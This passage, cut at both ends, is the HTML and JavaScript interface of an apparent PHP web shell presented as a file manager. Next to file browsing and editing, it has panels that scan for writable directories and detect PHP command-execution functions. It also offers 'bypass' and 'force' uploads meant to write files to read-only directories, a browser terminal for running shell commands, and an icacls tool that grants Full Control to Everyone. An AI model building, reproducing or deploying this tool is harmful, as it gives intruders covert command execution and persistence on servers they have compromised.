            <button class="btn btn-gold" onclick="FM.openUpload()">&#x2B06; Upload</button>
            <button class="btn" onclick="FM.openNewFile()">&#x1F4C4; New File</button>
            <button class="btn" onclick="FM.openNewFolder()">&#x1F4C1; New Folder</button>
            <div class="separator"></div>
            <button class="btn" onclick="FM.pasteClipboard()" id="paste-btn" disabled>&#x1F4CB; Paste</button>
            <div class="separator"></div>
            <input class="path-input" id="path-input" type="text" placeholder="Path..." onkeydown="if(event.key==='Enter')FM.navTo(this.value)">
            <button class="btn" onclick="FM.navTo(document.getElementById('path-input').value)">Go</button>
        </div>

        <!-- BREADCRUMB -->
        <div id="breadcrumb">
            <span style="cursor:pointer;color:var(--muted)" onclick="FM.navTo('')">&#x1F3E0;</span>
            <span id="breadcrumb-items"></span>
        </div>

        <!-- FILE LIST -->
        <div id="filelist-wrap">
            <table id="file-table">
                <thead>
                <tr>
                    <th class="row-check"><input type="checkbox" id="select-all-cb" onclick="FM.toggleSelectAll(this)"></th>
                    <th onclick="FM.sortBy('name')" id="th-name">Name <span class="sort-arrow">&#x25B2;</span></th>
                    <th onclick="FM.sortBy('size')" id="th-size">Size <span class="sort-arrow">&#x25B2;</span></th>
                    <th onclick="FM.sortBy('date')" id="th-date">Modified <span class="sort-arrow">&#x25B2;</span></th>
                    <th onclick="FM.sortBy('type')" id="th-type">Type <span class="sort-arrow">&#x25B2;</span></th>
                    <th>Attrs</th>
                    <th class="col-actions">Actions</th>
                </tr>
                </thead>
                <tbody id="file-tbody"></tbody>
            </table>
            <div id="file-empty" class="empty-state hidden">
                <div class="es-icon">&#x1F4C2;</div>
                <div>Empty directory</div>
            </div>
            <div id="file-loading" class="loading">Loading...</div>
        </div>

        <!-- STATUS BAR -->
        <div id="statusbar">
            <span id="status-path">Path: &mdash;</span>
            <span id="status-count">Items: &mdash;</span>
            <span id="status-selected">Selected: 0</span>
            <span id="status-free"></span>
        </div>
    </div>
</div>

<!-- WRITABLE DIRS MODAL -->
<div class="modal-overlay hidden" id="modal-wdirs">
<div class="modal modal-xl">
<div class="modal-header"><h2>&#x1F513; Writable Directories &amp; Bypass</h2><button class="modal-close" onclick="FM.closeModal('modal-wdirs')">&#x2715;</button></div>
<div class="modal-body">
    <div class="tab-bar">
        <button class="tab-btn active" onclick="FM.wdTab(this,'wd-tab-dirs')">Writable Dirs</button>
        <button class="tab-btn" onclick="FM.wdTab(this,'wd-tab-exec')">Exec Methods</button>
        <button class="tab-btn" onclick="FM.wdTab(this,'wd-tab-bypass')">Bypass Upload</button>
        <button class="tab-btn" onclick="FM.wdTab(this,'wd-tab-force')">Force Upload</button>
    </div>
    <!-- Tab: Writable Dirs -->
    <div class="tab-pane active" id="wd-tab-dirs" style="padding:16px 0 0 0">
        <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
            <span style="color:var(--muted);font-size:12px">Scans common writable paths and tests actual write access.</span>
            <button class="btn btn-gold btn-sm" onclick="FM.scanWritableDirs()">&#x1F504; Re-scan</button>
        </div>
        <div id="wdirs-scan-msg">Click Re-scan to detect writable directories.</div>
        <div id="wdirs-table-wrap"></div>
    </div>
    <!-- Tab: Exec Methods -->
    <div class="tab-pane" id="wd-tab-exec" style="padding:16px 0 0 0">
        <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
            <span style="color:var(--muted);font-size:12px">Detects available PHP command execution functions on this server.</span>
            <button class="btn btn-gold btn-sm" onclick="FM.scanExecMethods()">&#x1F504; Detect</button>
        </div>
        <div id="exec-methods-wrap"><div class="loading">Click Detect to check available methods.</div></div>
    </div>
    <!-- Tab: Bypass Upload -->
    <div class="tab-pane" id="wd-tab-bypass" style="padding:16px 0 0 0">
        <p style="color:var(--muted);font-size:12px;margin-bottom:14px">Use base64-encoded content upload when normal file upload fails due to permissions.</p>
        <div class="form-group">
            <label>Target Directory</label>
            <div style="display:flex;gap:8px">
                <input class="form-control" id="bypass-dest-path" type="text" placeholder="Leave blank to auto-select first writable dir">
                <button class="btn btn-sm" onclick="FM.setBypassPathToCurrent()">Use Current</button>
            </div>
        </div>
        <div class="form-group">
            <label>Select File</label>
            <input type="file" id="bypass-file-input" class="form-control" style="padding:6px">
        </div>
        <div class="form-group">
            <label>Filename Override (optional)</label>
            <input class="form-control" id="bypass-filename" type="text" placeholder="Leave blank to use original filename">
        </div>
        <div id="bypass-upload-result" style="margin-top:12px"></div>
        <div style="margin-top:12px;display:flex;gap:8px">
            <button class="btn btn-gold" onclick="FM.doBypassUpload()">&#x26A1; Upload via Bypass</button>
        </div>
    </div>
    <!-- Tab: Force Upload -->
    <div class="tab-pane" id="wd-tab-force" style="padding:16px 0 0 0">
        <p style="color:var(--warn);font-size:12px;margin-bottom:14px">&#x26A0; Force Upload attempts ALL write methods (11+ PHP/system methods) even on READ-ONLY directories. The web server process may have write access that PHP cannot detect.</p>
        <div class="form-group">
            <label>Target Directory</label>
            <div style="display:flex;gap:8px">
                <input class="form-control" id="force-dest-path" type="text" placeholder="Target directory path">
                <button class="btn btn-sm" onclick="FM.setForcePathToCurrent()">Use Current</button>
            </div>
        </div>
        <div class="form-group">
            <label>Select File</label>
            <input type="file" id="force-file-input" class="form-control" style="padding:6px">
        </div>
        <div class="form-group">
            <label>Filename Override (optional)</label>
            <input class="form-control" id="force-filename" type="text" placeholder="Leave blank to use original filename">
        </div>
        <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">
            <button class="btn btn-gold" onclick="FM.doForceUpload('file')">&#x26A1; Force Upload (File)</button>
            <button class="btn" style="border-color:var(--warn);color:var(--warn)" onclick="FM.doForceUpload('base64')">&#x26A1; Force Upload (Base64)</button>
        </div>
        <div id="force-upload-log" style="margin-top:14px"></div>
    </div>
</div>
<div class="modal-footer"><button class="btn" onclick="FM.closeModal('modal-wdirs')">Close</button></div>
</div>
</div>

<!-- ==================== MODALS ==================== -->

<!-- UPLOAD MODAL -->
<div class="modal-overlay hidden" id="modal-upload">
<div class="modal">
<div class="modal-header"><h2>&#x2B06; Upload Files</h2><button class="modal-close" onclick="FM.closeModal('modal-upload')">&#x2715;</button></div>
<div class="modal-body">
    <div id="drop-zone" onclick="document.getElementById('upload-file-input').click()" ondragover="FM.onDragOver(event)" ondragleave="FM.onDragLeave(event)" ondrop="FM.onDrop(event)">
        <div class="dz-icon">&#x2601;</div>
        <div>Drag &amp; drop files here, or <strong style="color:var(--gold)">click to browse</strong></div>
        <div style="color:var(--muted);font-size:12px;margin-top:6px">Max: <?php echo fm_format_size(FM_MAX_UPLOAD); ?> per file</div>
    </div>
    <input type="file" id="upload-file-input" multiple onchange="FM.uploadFiles(this.files)">
    <div id="upload-progress-list"></div>
</div>
<div class="modal-footer"><button class="btn" onclick="FM.closeModal('modal-upload')">Close</button></div>
</div>
</div>

<!-- NEW FILE MODAL -->
<div class="modal-overlay hidden" id="modal-newfile">
<div class="modal" style="width:440px">
<div class="modal-header"><h2>&#x1F4C4; New File</h2><button class="modal-close" onclick="FM.closeModal('modal-newfile')">&#x2715;</button></div>
<div class="modal-body">
    <div class="form-group"><label>File Name</label><input class="form-control" id="newfile-name" type="text" placeholder="example.txt" onkeydown="if(event.key==='Enter')FM.createFile()"></div>
</div>
<div class="modal-footer">
    <button class="btn" onclick="FM.closeModal('modal-newfile')">Cancel</button>
    <button class="btn btn-gold" onclick="FM.createFile()">Create</button>
</div>
</div>
</div>

<!-- NEW FOLDER MODAL -->
<div class="modal-overlay hidden" id="modal-newfolder">
<div class="modal" style="width:440px">
<div class="modal-header"><h2>&#x1F4C1; New Folder</h2><button class="modal-close" onclick="FM.closeModal('modal-newfolder')">&#x2715;</button></div>
<div class="modal-body">
    <div class="form-group"><label>Folder Name</label><input class="form-control" id="newfolder-name" type="text" placeholder="New Folder" onkeydown="if(event.key==='Enter')FM.createFolder()"></div>
</div>
<div class="modal-footer">
    <button class="btn" onclick="FM.closeModal('modal-newfolder')">Cancel</button>
    <button class="btn btn-gold" onclick="FM.createFolder()">Create</button>
</div>
</div>
</div>

<!-- RENAME MODAL -->
<div class="modal-overlay hidden" id="modal-rename">
<div class="modal" style="width:440px">
<div class="modal-header"><h2>&#x270F; Rename</h2><button class="modal-close" onclick="FM.closeModal('modal-rename')">&#x2715;</button></div>
<div class="modal-body">
    <input type="hidden" id="rename-path">
    <div class="form-group"><label>New Name</label><input class="form-control" id="rename-name" type="text" onkeydown="if(event.key==='Enter')FM.doRename()"></div>
</div>
<div class="modal-footer">
    <button class="btn" onclick="FM.closeModal('modal-rename')">Cancel</button>
    <button class="btn btn-gold" onclick="FM.doRename()">Rename</button>
</div>
</div>
</div>

<!-- FILE EDITOR MODAL -->
<div class="modal-overlay hidden" id="modal-editor">
<div class="modal modal-xl">
<div class="modal-header">
    <h2>&#x270F; Editor &mdash; <span id="editor-filename"></span></h2>
    <button class="modal-close" onclick="FM.closeModal('modal-editor')">&#x2715;</button>
</div>
<div class="modal-body" style="padding:12px">
    <input type="hidden" id="editor-path">
    <textarea id="editor-content" spellcheck="false" class="form-control"></textarea>
</div>
<div class="modal-footer">
    <span id="editor-status" style="flex:1;font-size:12px;color:var(--muted)"></span>
    <button class="btn" onclick="FM.closeModal('modal-editor')">Close</button>
    <button class="btn btn-gold" onclick="FM.saveFile()">&#x1F4BE; Save</button>
</div>
</div>
</div>

<!-- IMAGE VIEWER MODAL -->
<div class="modal-overlay hidden" id="modal-viewer">
<div class="modal modal-lg">
<div class="modal-header"><h2>&#x1F5BC; Viewer &mdash; <span id="viewer-filename"></span></h2><button class="modal-close" onclick="FM.closeModal('modal-viewer')">&#x2715;</button></div>
<div class="modal-body" id="viewer-body"></div>
</div>
</div>

<!-- PERMISSIONS MODAL -->
<div class="modal-overlay hidden" id="modal-perms">
<div class="modal">
<div class="modal-header"><h2>&#x1F510; Permissions &mdash; <span id="perms-filename"></span></h2><button class="modal-close" onclick="FM.closeModal('modal-perms')">&#x2715;</button></div>
<div class="modal-body">
    <input type="hidden" id="perms-path">
    <div id="perms-output">Loading...</div>
    <div class="form-group"><label>User</label><input class="form-control" id="perms-user" placeholder="Everyone  or  DOMAIN\\User"></div>
    <div class="form-group"><label>Permission (icacls notation)</label>
        <select class="form-control" id="perms-perm">
            <option value="F">F - Full Control</option>
            <option value="M">M - Modify</option>
            <option value="RX">RX - Read &amp; Execute</option>
            <option value="R">R - Read</option>
            <option value="W">W - Write</option>
        </select>
    </div>
</div>
<div class="modal-footer">
    <button class="btn" onclick="FM.closeModal('modal-perms')">Close</button>
    <button class="btn btn-gold" onclick="FM.applyPerms()">Apply icacls</button>
</div>
</div>
</div>

<!-- ZIP NAME MODAL -->
<div class="modal-overlay hidden" id="modal-zipname">
<div class="modal" style="width:440px">
<div class="modal-header"><h2>&#x1F4E6; Create Zip</h2><button class="modal-close" onclick="FM.closeModal('modal-zipname')">&#x2715;</button></div>
<div class="modal-body">
    <input type="hidden" id="zipname-targets">
    <div class="form-group"><label>Zip Filename (without .zip)</label><input class="form-control" id="zipname-input" type="text" onkeydown="if(event.key==='Enter')FM.doZip()"></div>
</div>
<div class="modal-footer">
    <button class="btn" onclick="FM.closeModal('modal-zipname')">Cancel</button>
    <button class="btn btn-gold" onclick="FM.doZip()">&#x1F4E6; Zip</button>
</div>
</div>
</div>

<!-- COPY/MOVE DEST MODAL -->
<div class="modal-overlay hidden" id="modal-copymove">
<div class="modal" style="width:500px">
<div class="modal-header"><h2 id="copymove-title">&#x1F4CB; Copy / Move</h2><button class="modal-close" onclick="FM.closeModal('modal-copymove')">&#x2715;</button></div>
<div class="modal-body">
    <input type="hidden" id="copymove-action">
    <input type="hidden" id="copymove-targets">
    <div class="form-group"><label>Destination Path</label><input class="form-control" id="copymove-dest" type="text" placeholder="C:\destination\path" onkeydown="if(event.key==='Enter')FM.doCopyMove()"></div>
</div>
<div class="modal-footer">
    <button class="btn" onclick="FM.closeModal('modal-copymove')">Cancel</button>
    <button class="btn btn-gold" onclick="FM.doCopyMove()">Execute</button>
</div>
</div>
</div>

<!-- SEARCH MODAL -->
<div class="modal-overlay hidden" id="modal-search">
<div class="modal modal-lg">
<div class="modal-header"><h2>&#x1F50D; Search</h2><button class="modal-close" onclick="FM.closeModal('modal-search')">&#x2715;</button></div>
<div class="modal-body">
    <div style="display:flex;gap:10px;margin-bottom:12px">
        <input class="form-control" id="search-query" type="text" placeholder="Search files/folders..." style="flex:1" onkeydown="if(event.key==='Enter')FM.doSearch()">
        <label style="display:flex;align-items:center;gap:6px;color:var(--muted);font-size:12px;cursor:pointer;white-space:nowrap">
            <input type="checkbox" id="search-content" style="accent-color:var(--gold)"> Search in content
        </label>
        <button class="btn btn-gold" onclick="FM.doSearch()">Search</button>
    </div>
    <div id="search-status" style="font-size:12px;color:var(--muted);margin-bottom:8px"></div>
    <div id="search-results"></div>
</div>
</div>
</div>

<!-- TERMINAL MODAL -->
<div class="modal-overlay hidden" id="modal-terminal">
<div class="modal modal-lg">
<div class="modal-header"><h2>&#x1F4BB; Linux Terminal</h2><button class="modal-close" onclick="FM.closeModal('modal-terminal')">&#x2715;</button></div>
<div class="modal-body">
    <div id="terminal-output"><span class="terminal-prompt">Linux Terminal &mdash; bash</span>
Ready. Type a command below.
</div>
    <input id="terminal-input" type="text" placeholder="Enter command... (e.g.: ls, id, uname -a)" onkeydown="FM.terminalKey(event)">
    <div style="font-size:11px;color:var(--muted);margin-top:6px">Press Enter to execute. Up/Down for history.</div>
</div>
<div class="modal-footer">
    <button class="btn" onclick="FM.clearTerminal()">&#x1F5D1; Clear</button>
    <button class="btn" onclick="FM.closeModal('modal-terminal')">Close</button>
</div>
</div>
</div>

<!-- SERVER INFO MODAL -->
<div class="modal-overlay hidden" id="modal-serverinfo">
<div class="modal modal-lg">
<div class="modal-header"><h2>&#x1F5A5; Server Information</h2><button class="modal-close" onclick="FM.closeModal('modal-serverinfo')">&#x2715;</button></div>
<div class="modal-body" id="serverinfo-body"><div class="loading">Loading...</div></div>
</div>
</div>

<!-- ==================== JAVASCRIPT ==================== -->
<script>
var FM = (function() {
'use strict';

// State
var state = {
    path: '',
    sort: 'name',
    order: 'asc',
    showHidden: false,
    selected: [],
    clipboard: null,
    termHistory: [],
    termHistIdx: -1,
    drives: <?php echo json_encode($drives); ?>,
};

// Polyfill: selected as pseudo-Set
var selectedSet = {
    _data: {},
    add: function(v) { this._data[v] = true; },
    delete: function(v) { delete this._data[v]; },
    has: function(v) { return !!this._data[v]; },
    clear: function() { this._data = {}; },
    get size() {
        return Object.keys(this._data).length;
    },
    toArray: function() { return Object.keys(this._data); }
};
state.selected = selectedSet;

// ---- INIT ----
function init() {
    var startPath = <?php echo json_encode(dirname(__FILE__)); ?>;
    navTo(startPath);
}

// ---- AJAX ----
function api(data, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', location.pathname, true);
    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
    var fd = new FormData();
    for (var k in data) {
        if (data.hasOwnProperty(k)) fd.append(k, data[k]);
    }
    xhr.onload = function() {
        try {
            var res = JSON.parse(xhr.responseText);
            callback(null, res);
        } catch(e) {
            callback(e, null);
        }
    };
    xhr.onerror = function() { callback(new Error('Network error'), null); };
    xhr.send(fd);
}

// Promise-like wrapper for async/await simulation
function apiP(data) {
    return new Promise(function(resolve, reject) {
        api(data, function(err, res) {
            if (err) resolve({ ok: false, msg: err.message });
            else resolve(res);
        });
    });
}

// ---- NAVIGATION ----
function navTo(path) {
    if (!path && path !== 0) {
        renderDriveList();
        return;
    }
    state.path = path;
    state.selected.clear();
    document.getElementById('path-input').value = path;
    updateBreadcrumb(path);
    loadDir(path);
}

function goUp() {
    if (!state.path || state.path === '/') return;
    var parent = state.path.replace(/\/+$/, '').split('/');
    parent.pop();
    var up = parent.join('/') || '/';
    navTo(up);
}

function refresh() { loadDir(state.path); }

// ---- BREADCRUMB ----
function updateBreadcrumb(path) {
    var el = document.getElementById('breadcrumb-items');
    if (!path) { el.innerHTML = ''; return; }
    var parts = path.split('/').filter(Boolean);
    var html = '', built = '';
    for (var i = 0; i < parts.length; i++) {
        var p = parts[i];
        built = '/' + (built ? built.replace(/^\//, '') + '/' : '') + p;
        var b = built;
        var color = (i === parts.length - 1) ? 'var(--gold)' : 'var(--info)';
        html += '<span style="color:var(--muted)"> \u203a </span><span style="cursor:pointer;color:' + color + '" onclick="FM.navTo(\'' + b.replace(/'/g,"\\'") + '\')">' + escHtml(p) + '</span>';
    }
    el.innerHTML = html;
}

// ---- LOAD DIR ----
function loadDir(path) {
    setLoading(true);
    apiP({
        action: 'list', path: path, sort: state.sort, order: state.order,
        hidden: state.showHidden ? '1' : '0'
    }).then(function(res) {
        setLoading(false);
        if (!res.ok) { toast(res.msg || 'Cannot read directory', 'error'); return; }
        renderFileList(res.data, path);
        updateStatus(path, res.data);
        updateDiskFree(path);
    });
}

function renderDriveList() {
    state.path = '';
    document.getElementById('path-input').value = '';
    document.getElementById('breadcrumb-items').innerHTML = '';
    document.getElementById('status-path').textContent = 'Path: (drives)';
    var tbody = document.getElementById('file-tbody');
    tbody.innerHTML = state.drives.map(function(d) {
        return '<tr>' +
            '<td class="row-check"></td>' +
            '<td><div class="file-name-cell">' +
            '<span class="file-icon">&#x1F4C0;</span>' +
            '<span class="file-name-text"><a href="#" class="dir-link" onclick="FM.navTo(\'' + escAttr(d) + '\');return false">' + escHtml(d) + '</a></span>' +
            '</div></td>' +
            '<td colspan="5"><span class="file-size" id="drive-sz-root">&mdash;</span></td>' +
            '</tr>';
    }).join('');
    document.getElementById('file-empty').classList.add('hidden');
    state.drives.forEach(function(d) { getDriveSize(d); });
}

function getDriveSize(d) {
    var el = document.getElementById('drive-sz-' + d[0]);
    if (!el) return;
    apiP({ action: 'serverinfo' }).then(function(res) {
        if (!res.ok) return;
        for (var i = 0; i < res.disks.length; i++) {
            if (res.disks[i].drive === d) {
                var info = res.disks[i];
                el.textContent = fmtSize(info.used) + ' used / ' + fmtSize(info.total) + ' total (' + info.pct + '% used)';
                break;
            }
        }
    });
}

// ---- RENDER FILE LIST ----
function renderFileList(data, path) {
    var tbody = document.getElementById('file-tbody');
    var empty  = document.getElementById('file-empty');
    var allItems = (data.dirs || []).concat(data.files || []);

    if (allItems.length === 0) {
        tbody.innerHTML = '';
        empty.classList.remove('hidden');
        return;
    }
    empty.classList.add('hidden');

    tbody.innerHTML = allItems.map(function(item) {
        var isHidden = item.hidden;
        var escapedPath = escAttr(item.path);
        var escapedName = escHtml(item.name);
        var selected = state.selected.has(item.path);
        var nameCell;
        if (item.is_dir) {
            nameCell = '<a href="#" class="dir-link file-name-link" onclick="FM.navTo(\'' + item.path.replace(/'/g,"\\'") + '\');return false">' + escapedName + '</a>';
        } else {
            nameCell = '<span class="file-name-link" style="cursor:pointer" onclick="FM.openFile(\'' + item.path.replace(/'/g,"\\'") + '\',\'' + escAttr(item.name).replace(/'/g,"\\'") + '\')">' + escapedName + '</span>';
        }
        return '<tr class="' + (selected?'selected':'') + ' ' + (isHidden?'hidden-file-row':'') + '" data-path="' + escapedPath + '">' +
            '<td class="row-check"><input type="checkbox" class="row-cb" value="' + escapedPath + '" onchange="FM.onRowCheck(this)" ' + (selected?'checked':'') + '></td>' +
            '<td><div class="file-name-cell">' +
            '<span class="file-icon">' + item.icon + '</span>' +
            '<span class="file-name-text">' + nameCell + '</span>' +
            (item.is_dir ? '' : '<span class="file-ext">' + escHtml(item.ext||'&mdash;') + '</span>') +
            '</div></td>' +
            '<td class="file-size">' + (item.is_dir ? '&mdash;' : fmtSize(item.size)) + '</td>' +
            '<td class="file-date">' + fmtDate(item.mtime) + '</td>' +
            '<td><span class="badge ' + (item.is_dir?'badge-dir':'badge-file') + '">' + (item.is_dir?'DIR':escHtml(item.ext||'FILE')) + '</span></td>' +
            '<td style="font-size:11px;color:var(--muted)">' + escHtml(item.attrib||'&mdash;') + '</td>' +
            '<td class="col-actions"><div class="row-action-btns">' +
            (!item.is_dir ? '<button class="btn btn-sm" title="Download" onclick="FM.downloadFile(\'' + item.path.replace(/\\/g,'\\\\').replace(/'/g,"\\'") + '\')">&#x2B07;</button>' : '') +
            (!item.is_dir && isTextFile(item.name) ? '<button class="btn btn-sm" title="Edit" onclick="FM.openEditor(\'' + item.path.replace(/\\/g,'\\\\').replace(/'/g,"\\'") + '\')">&#x270F;</button>' : '') +
            '<button class="btn btn-sm" title="Rename" onclick="FM.openRename(\'' + item.path.replace(/\\/g,'\\\\').replace(/'/g,"\\'") + '\',\'' + escAttr(item.name).replace(/'/g,"\\'") + '\')">&#x1F3F7;</button>' +
            '<button class="btn btn-sm btn-danger" title="Delete" onclick="FM.deleteItem(\'' + item.path.replace(/\\/g,'\\\\').replace(/'/g,"\\'") + '\',\'' + escAttr(item.name).replace(/'/g,"\\'") + '\')">&#x1F5D1;</button>' +
            '</div></td>' +
            '</tr>';
    }).join('');
}

// ---- STATUS ----
function updateStatus(path, data) {
    var dirs  = data.dirs  ? data.dirs.length  : 0;
    var files = data.files ? data.files.length : 0;
    document.getElementById('status-path').textContent = 'Path: ' + (path || '(drives)');
    document.getElementById('status-count').textContent = 'Items: ' + dirs + ' folders, ' + files + ' files';
    updateSelectedStatus();
}

function updateSelectedStatus() {
    document.getElementById('status-selected').textContent = 'Selected: ' + state.selected.size;
}

function updateDiskFree(path) {
    if (!path) return;
    var m = path.match(/^([A-Za-z]:)/);
    var drive = m ? m[1] : null;
    if (!drive) return;
    getDiskFree(drive + '\\', function(free) {
        if (free !== null) document.getElementById('status-free').textContent = 'Free: ' + fmtSize(free);
    });
}

function getDiskFree(drive, callback) {
    apiP({ action: 'serverinfo' }).then(function(res) {
        if (!res.ok) { callback(null); return; }
        var driveKey = drive.replace(/[\\/]+$/, '');
        for (var i = 0; i < res.disks.length; i++) {
            if (res.disks[i].drive === driveKey) {
                callback(res.disks[i].free);
                return;
            }
        }
        callback(null);
    });
}

// ---- LOADING STATE ----
function setLoading(v) {
    document.getElementById('file-loading').style.display = v ? 'block' : 'none';
    if (v) {
        document.getElementById('file-tbody').innerHTML = '';
        document.getElementById('file-empty').classList.add('hidden');
    }
}

// ---- SORT ----
function sortBy(col) {
    if (state.sort === col) {
        state.order = state.order === 'asc' ? 'desc' : 'asc';
    } else {
        state.sort = col;
        state.order = 'asc';
    }
    document.querySelectorAll('#file-table th').forEach(function(th) {
        th.classList.remove('sorted');
        var arrow = th.querySelector('.sort-arrow');
        if (arrow) arrow.textContent = '\u25B2';
    });
    var th = document.getElementById('th-' + col);
    if (th) {
        th.classList.add('sorted');
        var arrow = th.querySelector('.sort-arrow');
        if (arrow) arrow.textContent = state.order === 'asc' ? '\u25B2' : '\u25BC';
    }
    loadDir(state.path);
}

// ---- SELECTION ----
function onRowCheck(cb) {
    var path = cb.value;
    if (cb.checked) {
        state.selected.add(path);
        cb.closest('tr').classList.add('selected');
    } else {
        state.selected.delete(path);
        cb.closest('tr').classList.remove('selected');
    }
    updateSelectedStatus();
}

function toggleSelectAll(masterCb) {
    document.querySelectorAll('.row-cb').forEach(function(cb) {
        cb.checked = masterCb.checked;
        var path = cb.value;
        if (masterCb.checked) {
            state.selected.add(path);
            cb.closest('tr').classList.add('selected');
        } else {
            state.selected.delete(path);
            cb.closest('tr').classList.remove('selected');
        }
    });
    updateSelectedStatus();
}

// ---- HIDDEN FILES ----
function toggleHidden() {
    state.showHidden = !state.showHidden;
    var badge = document.getElementById('hidden-badge');
    badge.textContent = state.showHidden ? 'ON' : 'OFF';
    badge.style.color = state.showHidden ? 'var(--success)' : 'var(--danger)';
    badge.style.background = state.showHidden ? 'rgba(74,222,128,.15)' : 'rgba(255,107,107,.15)';
    loadDir(state.path);
}

// ---- UPLOAD ----
function openUpload() { openModal('modal-upload'); }

function onDragOver(e) {
    e.preventDefault();
    document.getElementById('drop-zone').classList.add('drag-over');
}
function onDragLeave(e) {
    document.getElementById('drop-zone').classList.remove('drag-over');
}
function onDrop(e) {
    e.preventDefault();
    document.getElementById('drop-zone').classList.remove('drag-over');
    uploadFiles(e.dataTransfer.files);
}

function uploadFiles(files) {
    if (!files || files.length === 0) return;
    var list = document.getElementById('upload-progress-list');
    var filesArr = Array.prototype.slice.call(files);
    filesArr.forEach(function(file) {
        var id = 'ui-' + Date.now() + Math.floor(Math.random()*10000);
        list.insertAdjacentHTML('beforeend',
            '<div class="upload-item" id="' + id + '">' +
            '<span>&#x1F4C4;</span>' +
            '<span class="ui-name">' + escHtml(file.name) + '</span>' +
            '<span class="ui-status" style="color:var(--warn)">Uploading...</span>' +
            '</div>');
        var fd = new FormData();
        fd.append('action', 'upload');
        fd.append('path', state.path);
        fd.append('files', file);
        var xhr = new XMLHttpRequest();
        xhr.open('POST', location.pathname, true);
        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
        xhr.onload = function() {
            try {
                var res = JSON.parse(xhr.responseText);
                var item = document.getElementById(id);
                if (item) {
                    var st = item.querySelector('.ui-status');
                    var ok = res.ok && res.data && res.data[0] && res.data[0].ok;
                    st.textContent = ok ? '\u2713 Done' : '\u2717 Failed';
                    st.className = 'ui-status ' + (ok ? '' : 'err');
                }
            } catch(e) {
                var item2 = document.getElementById(id);
                if (item2) item2.querySelector('.ui-status').textContent = '\u2717 Error';
            }
            refresh();
        };
        xhr.onerror = function() {
            var item = document.getElementById(id);
            if (item) item.querySelector('.ui-status').textContent = '\u2717 Error';
        };
        xhr.send(fd);
    });
}

// ---- DOWNLOAD ----
function downloadFile(path) {
    var a = document.createElement('a');
    a.href = location.pathname + '?action=download&path=' + encodeURIComponent(path);
    a.download = '';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

// ---- OPEN FILE ----
function openFile(path, name) {
    if (isImageFile(name)) {
        openImageViewer(path, name);
    } else if (isTextFile(name)) {
        openEditor(path);
    } else {
        if (confirm('Download "' + name + '"?')) downloadFile(path);
    }
}

// ---- EDITOR ----
function openEditor(path) {
    apiP({ action: 'read', path: path }).then(function(res) {
        if (!res.ok) { toast('Cannot read file: ' + res.msg, 'error'); return; }
        document.getElementById('editor-path').value = path;
        document.getElementById('editor-filename').textContent = res.name;
        document.getElementById('editor-content').value = res.content;
        document.getElementById('editor-status').textContent = '';
        openModal('modal-editor');
    });
}

function saveFile() {
    var path = document.getElementById('editor-path').value;
    var content = document.getElementById('editor-content').value;
    apiP({ action: 'save', path: path, content: content }).then(function(res) {
        document.getElementById('editor-status').textContent = res.msg;
        document.getElementById('editor-status').style.color = res.ok ? 'var(--success)' : 'var(--danger)';
        if (res.ok) toast('File saved.', 'success');
        else toast('Save failed: ' + res.msg, 'error');
    });
}

// ---- IMAGE VIEWER ----
function openImageViewer(path, name) {
    document.getElementById('viewer-filename').textContent = name;
    var url = location.pathname + '?action=download&path=' + encodeURIComponent(path);
    document.getElementById('viewer-body').innerHTML = '<div id="img-viewer-wrap"><img src="' + escAttr(url) + '" alt="' + escAttr(name) + '"></div>';
    openModal('modal-viewer');
}

// ---- NEW FILE ----
function openNewFile() {
    document.getElementById('newfile-name').value = '';
    openModal('modal-newfile');
    setTimeout(function() { document.getElementById('newfile-name').focus(); }, 100);
}

function createFile() {
    var name = document.getElementById('newfile-name').value.trim();
    if (!name) { toast('Enter a file name.', 'warn'); return; }
    apiP({ action: 'newfile', path: state.path, name: name }).then(function(res) {
        closeModal('modal-newfile');
        if (res.ok) { toast(res.msg, 'success'); refresh(); }
        else toast(res.msg, 'error');
    });
}

// ---- NEW FOLDER ----
function openNewFolder() {
    document.getElementById('newfolder-name').value = '';
    openModal('modal-newfolder');
    setTimeout(function() { document.getElementById('newfolder-name').focus(); }, 100);
}

function createFolder() {
    var name = document.getElementById('newfolder-name').value.trim();
    if (!name) { toast('Enter a folder name.', 'warn'); return; }
    apiP({ action: 'newfolder', path: state.path, name: name }).then(function(res) {
        closeModal('modal-newfolder');
        if (res.ok) { toast(res.msg, 'success'); refresh(); }
        else toast(res.msg, 'error');
    });
}

// ---- RENAME ----
function openRename(path, name) {
    document.getElementById('rename-path').value = path;
    document.getElementById('rename-name').value = name;
    openModal('modal-rename');
    setTimeout(function() {
        var inp = document.getElementById('rename-name');
        inp.focus();
        var dot = name.lastIndexOf('.');
        inp.setSelectionRange(0, dot > 0 ? dot : name.length);
    }, 100);
}

function doRename() {
    var path = document.getElementById('rename-path').value;
    var name = document.getElementById('rename-name').value.trim();
    if (!name) { toast('Enter a name.', 'warn'); return; }
    apiP({ action: 'rename', path: path, name: name }).then(function(res) {
        closeModal('modal-rename');
        if (res.ok) { toast(res.msg, 'success'); refresh(); }
        else toast(res.msg, 'error');
    });
}

// ---- DELETE ----
function deleteItem(path, name) {
    if (!confirm('Delete "' + name + '"? This cannot be undone.')) return;
    apiP({ action: 'delete', path: path, targets: JSON.stringify([path]) }).then(function(res) {
        if (res.ok) { toast('Deleted.', 'success'); refresh(); }
        else toast(res.msg, 'error');
    });
}

// ---- CLIPBOARD / COPY / MOVE ----
function openCopyMove(action, targets) {
    state.clipboard = { action: action, targets: targets };
    document.getElementById('copymove-action').value = action;
    document.getElementById('copymove-targets').value = JSON.stringify(targets);
    document.getElementById('copymove-title').textContent = action === 'copy' ? '\uD83D\uDCCB Copy To' : '\u2702 Move To';
    document.getElementById('copymove-dest').value = state.path;
    openModal('modal-copymove');
    setTimeout(function() { document.getElementById('copymove-dest').focus(); }, 100);
}

function doCopyMove() {
    var action  = document.getElementById('copymove-action').value;
    var targets = document.getElementById('copymove-targets').value;
    var dest    = document.getElementById('copymove-dest').value.trim();
    if (!dest) { toast('Enter destination path.', 'warn'); return; }
    apiP({ action: action, path2: dest, targets: targets }).then(function(res) {
        closeModal('modal-copymove');
        if (res.ok) { toast(res.msg, 'success'); refresh(); }
        else toast(res.msg, 'error');
        state.clipboard = null;
